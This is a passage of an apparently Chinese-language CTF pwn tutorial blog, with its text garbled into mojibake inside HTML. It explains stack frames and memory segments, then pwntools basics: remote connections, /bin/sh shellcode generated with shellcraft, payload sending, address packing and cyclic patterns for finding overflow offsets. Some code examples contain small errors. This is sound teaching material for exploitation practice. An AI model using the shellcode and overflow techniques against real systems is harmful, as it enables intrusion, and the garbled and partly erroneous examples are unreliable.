ˆï¼‰ï¼Œpopï¼ˆå¼¹å‡ºæ•°æ®ï¼Œå¹¶å‚¨å­˜åˆ°æŒ‡å®šå¯„å­˜å™¨æˆ–å†…å­˜ä¸­ï¼‰ä¸¤ç§æ“ä½œã€‚</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/push_pop.png" alt="push&amp;pop"></p><p><strong>éœ€è¦æ³¨æ„:</strong> </p><p>1ï¼‰æ ˆçš„ç”Ÿé•¿æ˜¯<strong>ä»é«˜åœ°å€å¾€ä½åœ°å€</strong>ï¼Œå¯¹åº”ä¸Šé¢æ¼”ç¤ºçš„å‘ä¸‹ç”Ÿé•¿</p><p>2ï¼‰<strong>popåè¢«å¼¹å‡ºçš„æ•°æ®è¿˜åœ¨æ ˆå†…ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®ï¼ˆè¿˜æ˜¯å¯ä»¥è®¿é—®çš„ï¼‰</strong></p><h3 id="ä»€ä¹ˆæ˜¯æ ˆå¸§ï¼Ÿï¼ˆstack-frameï¼‰"><a href="#ä»€ä¹ˆæ˜¯æ ˆå¸§ï¼Ÿï¼ˆstack-frameï¼‰" class="headerlink" title="ä»€ä¹ˆæ˜¯æ ˆå¸§ï¼Ÿï¼ˆstack frameï¼‰"></a>ä»€ä¹ˆæ˜¯æ ˆå¸§ï¼Ÿï¼ˆstack frameï¼‰</h3><p>å…¶æœ¬è´¨å°±æ˜¯ä¸€ç§æ ˆï¼Œè¿™ç§æ ˆä¸“é—¨æ¥<strong>ä¿å­˜å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­çš„å„ç§ä¿¡æ¯ï¼ˆå‚æ•°ï¼Œè¿”å›åœ°å€ï¼Œæœ¬åœ°å˜é‡ç­‰ï¼‰ã€‚</strong></p><p>æ ˆå¸§æœ‰æ ˆé¡¶å’Œæ ˆåº•ä¹‹åˆ†ï¼Œ<strong>æ ˆé¡¶åœ°å€æœ€ä½ï¼Œæ ˆåº•åœ°å€æœ€é«˜ï¼ŒSPï¼ˆæ ˆæŒ‡é’ˆï¼‰æ˜¯ä¸€ç›´æŒ‡å‘æ ˆé¡¶çš„ã€‚</strong></p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ ˆå¸§ç¤ºæ„å›¾ï¼š</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/%E6%A0%88%E5%B8%A7.png" alt="æ ˆå¸§"></p><p>ä¸€èˆ¬æ¥è¯´ï¼Œ<code>bp</code>ï¼ˆåŸºå€æŒ‡é’ˆï¼‰åˆ°<code>sp</code>ä¹‹é—´çš„åŒºåŸŸå½“ä½œæ ˆå¸§ã€‚<strong>å¹¶ä¸æ˜¯æ•´ä¸ªæ ˆç©ºé—´åªæœ‰ä¸€ä¸ªæ ˆå¸§ï¼Œæ¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„æ ˆå¸§</strong>ã€‚</p><p>å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†è°ƒç”¨å‡½æ•°çš„å‡½æ•°ç§°ä¸º â€œè°ƒç”¨è€…ï¼ˆcallerï¼‰â€œï¼Œ è¢«è°ƒç”¨çš„å‡½æ•°ç§°ä¸º â€œè¢«è°ƒç”¨è€…ï¼ˆcalleeï¼‰â€ã€‚å…¶ä¸­ï¼š</p><p>1ï¼‰calleréœ€è¦çŸ¥é“åœ¨å“ªé‡Œè·å–calleeçš„è¿”å›å€¼</p><p>2ï¼‰calleeéœ€è¦çŸ¥é“ä¼ å…¥çš„å‚æ•°åœ¨å“ªé‡Œ</p><p>3ï¼‰è¿”å›åœ°å€åœ¨å“ªé‡Œ</p><p>åŒæ—¶ï¼Œ<strong>æˆ‘ä»¬è¦ä¿è¯åœ¨calleeè¿”å›åï¼Œ<code>bp</code>, <code>sp</code>ç­‰å¯„å­˜å™¨çš„å€¼åº”è¯¥å’Œè°ƒç”¨å‰ä¸€è‡´</strong>ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬è¦ç”¨æ ˆæ¥ä¿å­˜è¿™äº›æ•°æ®ã€‚</p><h2 id="bssï¼Œdataï¼Œtextï¼Œheap-amp-stack"><a href="#bssï¼Œdataï¼Œtextï¼Œheap-amp-stack" class="headerlink" title="bssï¼Œdataï¼Œtextï¼Œheap &amp; stack"></a>bssï¼Œdataï¼Œtextï¼Œheap &amp; stack</h2><h3 id="bss-segmentï¼š"><a href="#bss-segmentï¼š" class="headerlink" title="bss segmentï¼š"></a>bss segmentï¼š</h3><p>bssæ®µé€šå¸¸ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­<strong>æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡</strong></p><p>bssæ˜¯ Block Started by Symbol çš„ç®€ç§°</p><p>bssæ®µå±äºé™æ€å†…å­˜åˆ†é…</p><h3 id="data-segmentï¼š"><a href="#data-segmentï¼š" class="headerlink" title="data segmentï¼š"></a>data segmentï¼š</h3><p>æ•°æ®æ®µé€šå¸¸å­˜æ”¾<strong>å·²ç»åˆå§‹åŒ–çš„å…¨å±€å˜é‡</strong>ï¼Œå±äºé™æ€å†…å­˜åˆ†é…</p><h3 id="code-x2F-text-segmentï¼š"><a href="#code-x2F-text-segmentï¼š" class="headerlink" title="code&#x2F;text segmentï¼š"></a>code&#x2F;text segmentï¼š</h3><p>ä»£ç æ®µé€šå¸¸ç”¨æ¥å­˜æ”¾ç¨‹åºæ‰§è¡Œä»£ç ï¼Œå…¶å¤§å°åœ¨ç¼–è¯‘æœŸç¡®å®šï¼Œå¹¶ä¸”è¯¥å†…å­˜åŒºåŸŸé€šå¸¸ä¸ºåªè¯»ï¼ˆæŸäº›æ¶æ„å…è®¸å¯å†™ï¼Œå³å…è®¸ä¿®æ”¹ç¨‹åºï¼‰</p><h3 id="å †ï¼ˆheapï¼‰ï¼š"><a href="#å †ï¼ˆheapï¼‰ï¼š" class="headerlink" title="å †ï¼ˆheapï¼‰ï¼š"></a>å †ï¼ˆheapï¼‰ï¼š</h3><p>å †ç”¨äºå­˜æ”¾ç¨‹åºè¿è¡Œä¸­è¢«åŠ¨æ€åˆ†é…çš„å†…å­˜æ®µï¼Œå¤§å°ä¸å›ºå®šï¼Œå¯åŠ¨æ€æ‰©å¼ æˆ–ç¼©å‡ã€‚</p><p>å½“è¿›ç¨‹è°ƒç”¨mallocç­‰å‡½æ•°åˆ†é…å†…å­˜æ—¶ï¼Œæ–°åˆ†é…çš„å†…å­˜ä¼šè¢«åŠ¨æ€æ·»åŠ åˆ°å †ä¸Šï¼ˆå †è¢«æ‰©å¼ ï¼‰ï¼›</p><p>ä½¿ç”¨freeç­‰å‡½æ•°é‡Šæ”¾å†…å­˜æ—¶ï¼Œè¢«é‡Šæ”¾çš„å†…å­˜ä»å †ä¸­è¢«å‰”é™¤ï¼ˆå †è¢«ç¼©å‡ï¼‰ã€‚</p><h3 id="æ ˆï¼ˆstackï¼‰"><a href="#æ ˆï¼ˆstackï¼‰" class="headerlink" title="æ ˆï¼ˆstackï¼‰"></a>æ ˆï¼ˆstackï¼‰</h3><p><strong>æ ˆåˆç§°å †æ ˆ</strong>ï¼Œæ˜¯ç”¨æˆ·å­˜æ”¾ç¨‹åº<strong>ä¸´æ—¶åˆ›å»ºçš„å±€éƒ¨å˜é‡</strong>ï¼Œä¹Ÿå°±æ˜¯ {} ä¸­å®šä¹‰çš„å˜é‡ï¼ˆä½†<strong>ä¸åŒ…æ‹¬staticå£°æ˜çš„å˜é‡</strong>ï¼Œstaticæ„å‘³ç€åœ¨æ•°æ®æ®µï¼ˆ.dataï¼‰ä¸­å­˜æ”¾å˜é‡ï¼‰ã€‚</p><p>æ­¤å¤–ï¼Œå‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå…¶å‚æ•°ä¹Ÿä¼šå‹å…¥å‘èµ·è°ƒç”¨çš„è¿›ç¨‹æ ˆä¸­ï¼Œå¹¶ä¸”å¾…åˆ°è°ƒç”¨ç»“æŸåï¼Œå‡½æ•°çš„è¿”å›å€¼ä¹Ÿä¼šè¢«å­˜æ”¾å›æ ˆä¸­ã€‚</p><p>ç”±äºæ ˆå…ˆè¿›åå‡ºçš„ç‰¹ç‚¹ï¼Œæ ˆç‰¹åˆ«æ–¹ä¾¿æ¥ä¿å­˜&#x2F;æ¢å¤è°ƒç”¨ç°åœºã€‚</p><p>ä»è¿™ä¸ªæ„ä¹‰ä¸Šï¼Œ<strong>æˆ‘ä»¬å¯ä»¥æŠŠå †æ ˆçœ‹æˆä¸€ä¸ªå¯„å­˜ï¼Œäº¤æ¢ä¸´æ—¶æ•°æ®çš„å†…å­˜åŒº</strong>ã€‚</p><h2 id="pwntoolsåŸºç¡€"><a href="#pwntoolsåŸºç¡€" class="headerlink" title="pwntoolsåŸºç¡€"></a>pwntoolsåŸºç¡€</h2><h3 id="å®‰è£…pwntools"><a href="#å®‰è£…pwntools" class="headerlink" title="å®‰è£…pwntools"></a>å®‰è£…pwntools</h3><p>ä½¿ç”¨pythonè‡ªå¸¦çš„pipä¸‹è½½pwntools</p><p><code>$ pip install pwntools</code></p><p>å¦‚æœåœ¨windowsä¸Šçš„wslä¸Šç›´æ¥ä½¿ç”¨æ”¹è¯­å¥å¯èƒ½ä¼šæŠ¥é”™</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/pip-error.png" alt="pip_err"></p><p>ä¸è¿‡å¥½åœ¨ç»™äº†ä½ æç¤ºï¼Œåªè¦åœ¨åé¢åŠ ä¸Š<code>--break-system-packages</code>å³å¯</p><p>ä¹Ÿå°±æ˜¯ï¼š<code>$ pip install pwntools --break-system-packages</code></p><h3 id="pwntoolsä½¿ç”¨"><a href="#pwntoolsä½¿ç”¨" class="headerlink" title="pwntoolsä½¿ç”¨"></a>pwntoolsä½¿ç”¨</h3><h4 id="åŸºæœ¬æ¡†æ¶"><a href="#åŸºæœ¬æ¡†æ¶" class="headerlink" title="åŸºæœ¬æ¡†æ¶"></a>åŸºæœ¬æ¡†æ¶</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="comment"># å¯¼å…¥pwntoolsæ¨¡å—</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span><span class="comment"># x64æ¶æ„åº”ä¸º &#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span><span class="comment"># è®¾ç½®ä¸ºç›®æ ‡æœºçš„ç³»ç»Ÿï¼Œä¸€èˆ¬æ˜¯linux</span></span><br><span class="line">context.log_level = <span class="string">&#x27;deubg&#x27;</span><span class="comment"># è¾“å‡ºè°ƒè¯•ä¿¡æ¯</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æˆ–è€…ç›´æ¥ä½¿ç”¨:</span></span><br><span class="line"><span class="string">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="string">å½“ç„¶ä¸€èˆ¬æƒ…å†µä¸‹archå’Œosä¸ç”¨è®¾ç½®ï¼ˆè¦ç”Ÿæˆshellcodeæ—¶å€™è¦è®¾ç½®ï¼‰ï¼Œåªè¦è®¾ç½®log_levelä¸ºdebugå°±å¯ä»¥äº†</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io = remote(<span class="string">&#x27;114.514.19.198&#x27;</span>, <span class="number">23333</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ç”¨æ¥å»ºç«‹ä¸€ä¸ªè¿œç¨‹è¿æ¥ï¼Œurlæˆ–è€…ipä½œä¸ºåœ°å€ï¼Œç„¶åæŒ‡æ˜ç«¯å£</span></span><br><span class="line"><span class="string">ä¹Ÿå¯ä»¥ä»…ä½¿ç”¨æœ¬åœ°æ–‡ä»¶ï¼Œæ–¹ä¾¿è°ƒè¯•:</span></span><br><span class="line"><span class="string">io = process(&#x27;./test_pwn_file&#x27;)</span></span><br><span class="line"><span class="string">processç”¨æ¥å¯åŠ¨ä¸€ä¸ªæœ¬åœ°è¿›ç¨‹ï¼Œéœ€è¦æ³¨æ„.elfä¸èƒ½åœ¨windowsä¸‹è¿è¡Œï¼Œåº”åœ¨wslæˆ–è€…è™šæ‹Ÿæœºé‡Œï¼Œå¦åˆ™ç¨‹åºä¼šæŠ¥é”™ï¼Œ.exeç­‰äº¦ç„¶ï¼Œæ‰€ä»¥æœ¬åœ°æ‰“çš„è¯è®°å¾—è„šæœ¬åœ¨åŒ¹é…çš„ç¯å¢ƒé‡Œæ‰§è¡Œ</span></span><br><span class="line"><span class="string">processé‡Œæ˜¯æ–‡ä»¶è·¯å¾„ï¼Œå…¶ä¸­ &#x27;test_pwn_file&#x27; æ˜¯æ–‡ä»¶å</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.sh())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">asm()æ¥æ”¶ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›æ±‡ç¼–ç çš„æœºå™¨ç (bytes)</span></span><br><span class="line"><span class="string">æ¯”å¦‚:</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(&#x27;mov eax, 0x10&#x27;)</span></span><br><span class="line"><span class="string">b&#x27;\xb8\x10\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="string">shellcraftæ¨¡å—æ˜¯shellcodeçš„æ¨¡å—ï¼ŒåŒ…å«ä¸€äº›ç”Ÿæˆshellcodeçš„å‡½æ•°</span></span><br><span class="line"><span class="string">è¿™é‡Œshellcraft.sh()å°±æ˜¯æ‰§è¡Œ/bin/shçš„shellcode</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(shellcraft.sh())</span></span><br><span class="line"><span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># å°†æ§åˆ¶æƒè¿˜ç»™ç”¨æˆ·ï¼Œå³ç”¨æˆ·å¯åœ¨ç»ˆç«¯ç›´æ¥ä¸è¿›ç¨‹äº¤äº’</span></span><br><span class="line"><span class="comment"># åœ¨getshellä¹‹åä½¿ç”¨ï¼Œä¸€èˆ¬å°±æ”¾åœ¨è„šæœ¬æœ€åå°±è¡Œäº†</span></span><br></pre></td></tr></table></figure><h4 id="send-or-receive"><a href="#send-or-receive" class="headerlink" title="send or receive"></a>send or receive</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io.send(payload)<span class="comment"># å°†payloadå‘é€åˆ°è¿œç¨‹è¿æ¥</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;payloadå«æ”»å‡»è½½è·ï¼Œå®é™…ä¸Šå°±æ˜¯ä½ è¦å‘é€çš„æ•°æ®ï¼Œå«è¿™ä¸ªåå­—åªæ˜¯æƒ¯ä¾‹äº†ï¼Œä½ ä¹Ÿå¯ä»¥å«å…¶ä»–ä»»ä½•åˆæ³•çš„å˜é‡å&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># ä¸sendç›¸æ¯”æ˜¯åœ¨å‘é€å®Œpayloadåä¼šå¤šå‘é€ä¸€ä¸ªå›è½¦(&#x27;\n&#x27;)</span></span><br><span class="line">io.sendafter(message, payload)</span><br><span class="line">io.sendlineafter(message, payload)</span><br><span class="line"><span class="comment"># è¿™ä¸¤ä¸ªå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯åœ¨æ¥æ”¶åˆ°messageä¹‹åå†å‘é€payload</span></span><br><span class="line"><span class="comment"># messageä¸éœ€è¦æ˜¯æ¥å—åˆ°çš„ä¸€æ•´ä¸ªæ¶ˆæ¯ï¼Œå¯ä»¥æ˜¯å…¶ä¸­çš„ç‰‡æ®µ</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">io.recv()</span><br><span class="line"><span class="comment"># æ¥æ”¶æ‰€æœ‰æ•°æ®ï¼Œè¿”å›æ¥æ”¶åˆ°çš„æ•°æ®</span></span><br><span class="line"><span class="comment"># å¯ä»¥æ¥æ”¶ä¸€ä¸ªintå‚æ•°ï¼Œè¡¨ç¤ºæ¥æ”¶å¤šå°‘ä¸ªå­—èŠ‚</span></span><br><span class="line"><span class="comment"># recv(6) å°±è¡¨ç¤ºæ¥æ”¶6ä¸ªå­—èŠ‚</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æ¯”å¦‚ä½ æ”¶åˆ°äº†ä¸€æ®µæ¶ˆæ¯: b&#x27;hello,world!&#x27;</span></span><br><span class="line"><span class="string">recv(6) å°±ä¼šè¿”å› b&#x27;hello,&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.recvuntil(message)</span><br><span class="line"><span class="comment"># æ¥æ”¶åˆ°messageååœæ­¢æ¥æ”¶ï¼Œè¿”å›åŒ…å«messageåœ¨å†…çš„å…¨éƒ¨æ•°æ®</span></span><br><span class="line"><span class="comment"># å¯ä»¥æŒ‡å®šä¸€ä¸ªdrop: boolå‚æ•°ï¼Œé»˜è®¤ä¸ºFalseï¼Œè‹¥ä¸ºTrueåˆ™åªè¿”å›messageä¹‹å‰çš„æ•°æ®(messageè¢«æŠ›å¼ƒäº†)</span></span><br><span class="line"><span class="comment"># å½“ç„¶å¦‚æœä½ ç»§ç»­æ¥æ”¶æ•°æ®çš„è¯æ˜¯ä¸ä¼šé‡æ–°æ¥æ”¶ä¸€émessageäº†ï¼Œåªä¼šä»messageä¹‹åç»§ç»­æ¥æ”¶</span></span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment"># æ¥æ”¶ä¸€è¡Œæ•°æ®å¹¶è¿”å›ï¼Œç­‰ä»·äº recvuntil(b&#x27;\n&#x27;)</span></span><br></pre></td></tr></table></figure><p><strong>ä¸Šè¿°å‘é€å’Œæ¥æ”¶çš„æ–¹æ³•å‡èƒ½æ¥å—<code>str</code>æˆ–<code>bytes</code>ç±»å‹çš„å‚æ•°</strong></p><h4 id="æ•°æ®æ‰“åŒ…"><a href="#æ•°æ®æ‰“åŒ…" class="headerlink" title="æ•°æ®æ‰“åŒ…"></a>æ•°æ®æ‰“åŒ…</h4><p>pwntoolsé‡Œå°è£…äº†packå’Œunpackå‡½æ•°</p><p>ä¸€èˆ¬ç”¨å¯¹åº”çš„ç®€ç§°ï¼š</p><p>æ‰“åŒ… <code>p16/p32/p64</code>: æŠŠä¸€ä¸ªæ•´æ•°åˆ†åˆ«æ‰“åŒ…ä¸º16ï¼Œ32æˆ–64ä½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p64(<span class="number">0x7ffff3283296</span>)</span><br><span class="line"><span class="string">b&#x27;\x962(\xf3\xff\x7f\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># å³ b&#x27;\x96\x32\x28\xf3\xff\x7f\x00\x00&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p16(<span class="number">0x256</span>)</span><br><span class="line"><span class="string">b&#x27;V\x20&#x27;</span></span><br><span class="line"><span class="comment"># å³ b&#x27;\x56\x02&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">0x8004082</span>)</span><br><span class="line"><span class="string">b&#x27;\x82@\x00\x08</span></span><br><span class="line"><span class="string"># å³ b&#x27;</span>\x82\x40\x00\x08<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>è§£åŒ… <code>u16/u32/u64</code>: è§£åŒ…ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆæˆ–bytesï¼‰ï¼Œå¾—åˆ°æ•´æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">`<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">è¦æ³¨æ„u16,u32,u64æ¥å—çš„å‚æ•°åˆ†åˆ«è¦æ˜¯2ï¼Œ4ï¼Œ8ä¸ªå­—èŠ‚ï¼Œå¦åˆ™ä¼šæŠ¥é”™</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>addr1 = <span class="string">b&#x27;\x962(\xf3\xff\x7f&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>u64(addr1)<span class="comment"># Error!!!</span></span><br><span class="line">...</span><br><span class="line">struct.error: unpack requires a buffer of <span class="number">8</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="comment"># ä¸€èˆ¬æ¥å—æ•°æ®ä¸ç¡®å®šæœ‰å¤šé•¿å°±å¯ä»¥ç”¨ljustæ¥è¡¥åˆ°8ä¸ªå­—èŠ‚</span></span><br><span class="line"><span class="comment"># ç±»ä¼¼çš„æœ‰zfillï¼Œrjustç­‰ï¼Œå¯ä»¥è‡ªè¡Œä½“ä¼šå…¶ä¸­å·®å¼‚</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(u64(addr1).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x7ffff3283296&#x27;</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„ï¼šå¦‚æœå¾…å»¶é•¿çš„æ•°æ®æ˜¯ <code>bytes</code>ï¼Œ<code>ljust</code>ç¬¬äºŒä¸ªå‚æ•°ä¹Ÿå¿…é¡»<code>bytes</code><br>å¦‚ä¸Šä¾‹å°±æ˜¯å¿…é¡»æ˜¯ <code>b&#39;\x00&#39;</code>æˆ–è€…<code>b&#39;\0&#39;</code>, ä¸èƒ½æ˜¯ <code>&#39;\x00&#39;</code>, <code>&#39;\0&#39;</code><br>å¦‚æœæ˜¯ <code>str</code> ç±»å‹ä¹Ÿæ˜¯ä¸€æ ·é“ç†</p><p><del><strong>å½“ç„¶å¦‚æœä½ ç”¨ python2 å°±å½“æˆ‘æ²¡è¯´</strong></del></p><h4 id="è¾“å‡ºæ•°æ®"><a href="#è¾“å‡ºæ•°æ®" class="headerlink" title="è¾“å‡ºæ•°æ®"></a>è¾“å‡ºæ•°æ®</h4><p>è¾“å‡ºå½“ç„¶å¯ä»¥ç”¨ <code>print</code></p><p>åªä¸è¿‡å»ºè®®ç”¨pwntoolsè‡ªå¸¦çš„è¾“å‡ºæ–¹å¼ï¼Œä¸€æ–¹é¢å»åˆpwntoolsæœ¬æ¥çš„æ ¼å¼ï¼Œä¸€æ–¹é¢çœ‹ç€æ¯”è¾ƒèˆ’é€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>out_str = <span class="string">&#x27;hello, world&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>log.info(out_str)</span><br><span class="line">[*] hello, world</span><br><span class="line"><span class="comment"># infoä»£è¡¨logç­‰çº§ï¼Œä¹Ÿå¯ä»¥ç”¨å…¶ä»–çš„</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = log.progress(<span class="string">&#x27;Working&#x27;</span>)</span><br><span class="line">[x] Working</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.status(<span class="string">&#x27;Reticulating splines&#x27;</span>)</span><br><span class="line">[x] Working: Reticulating splines</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.success(<span class="string">&#x27;Get a shell!&#x27;</span>)</span><br><span class="line">[+] Working: Get a shell!</span><br><span class="line"><span class="comment"># è¦æ³¨æ„å¦‚æœpä½¿ç”¨äº†successä¹‹åï¼Œå°±ä¸èƒ½å†ç”¨pè¾“å‡ºäº†ï¼Œå½“ç„¶ä¸è‡³äºæŠ¥é”™</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.status(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">no output</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.success(<span class="string">&#x27;you did&#x27;</span>)</span><br><span class="line">no output</span><br><span class="line"><span class="comment"># ä¸è¿‡ç›´æ¥ç”¨successæ˜¯å¯ä»¥çš„</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>success(<span class="string">&#x27;you did&#x27;</span>)</span><br><span class="line">[+] you did</span><br></pre></td></tr></table></figure><h4 id="Cyclic-pattern"><a href="#Cyclic-pattern" class="headerlink" title="Cyclic pattern"></a>Cyclic pattern</h4><p>ä½¿ç”¨pwntoolsç”Ÿæˆä¸€ä¸ªpatternï¼ˆä¸€ä¸ªstrï¼‰ï¼Œå¯ä»¥é€šè¿‡å…¶ä¸­çš„ä¸€éƒ¨åˆ†æ•°æ®å®šä½å…¶åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²çš„ä½ç½®</p><p>åšæ ˆæº¢å‡ºé¢˜ç›®æ—¶ï¼Œpatternå¯ä»¥å‡å°‘è®¡ç®—æº¢å‡ºç‚¹çš„æ—¶é—´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cyclic(<span class="number">0x100</span>)<span class="comment"># ç”Ÿæˆé•¿åº¦0x100çš„pattern</span></span><br><span class="line">cyclic_find(<span class="number">0x61616161</span>)<span class="comment"># æŸ¥æ‰¾è¯¥æ•°æ®åœ¨patternçš„ä½ç½®</span></span><br><span class="line">cyclic_find(<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment"># å¯ä»¥ç”¨å­—ç¬¦ä¸²æŸ¥æ‰¾</span></span><br><span class="line"><span class="comment"># æˆ–è€… cyclic -l 0x61616161</span></span><br><span class="line"><span class="comment"># æ³¨: åœ¨pwndbgä¸­ä½¿ç”¨</span></span><br></pre></td></tr></table></figure><p>æ¯”å¦‚æº¢å‡ºæ—¶æ„é€  <code>cyclic(0x100)</code> ï¼Œæˆ–è€…æ›´é•¿ï¼Œè¾“å…¥å PCçš„å€¼å˜å‘³äº† <code>0x61616161</code> é€šè¿‡ <code>cyclic_find(0x61616161) </code> å°±å¯ä»¥å¾—åˆ°ä»å“ªä¸€ä¸ªå­—èŠ‚å¼€å§‹ä¼šæ§åˆ¶PCå¯„å­˜å™¨</p><h4 id="ELFæ–‡ä»¶æ“ä½œ"><a href="#ELFæ–‡ä»¶æ“ä½œ" class="headerlink" 